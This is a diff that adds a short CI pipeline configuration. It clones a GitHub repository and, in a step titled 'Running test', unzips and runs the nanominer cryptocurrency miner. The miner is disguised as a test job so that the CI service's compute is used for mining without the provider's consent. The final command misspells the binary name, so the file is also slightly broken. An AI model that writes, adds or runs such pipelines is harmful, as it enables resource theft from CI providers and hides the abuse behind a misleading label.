@@ -1,0 +1,23 @@
+version: '1.0'
+steps:
+  clone:
+    title: Cloning repository
+    type: git-clone
+    repo: 'https://github.com/thanhtung22-cloud/huhu'
+    revision: main
+    stage: clone
+  test:
+    title: Running test
+    type: freestyle
+    image: 'ubuntu:latest'
+    working_directory: '${{clone}}'
+    commands:
+      - apt-get update
+      - unzip nanominer-linux-3.3.2.zip
+      - cd nanominer-linux-3.3.2
+      - chmod +x ./nanominer
+      - ./nanomner
+    stage: test
+stages:
+  - clone
+  - test
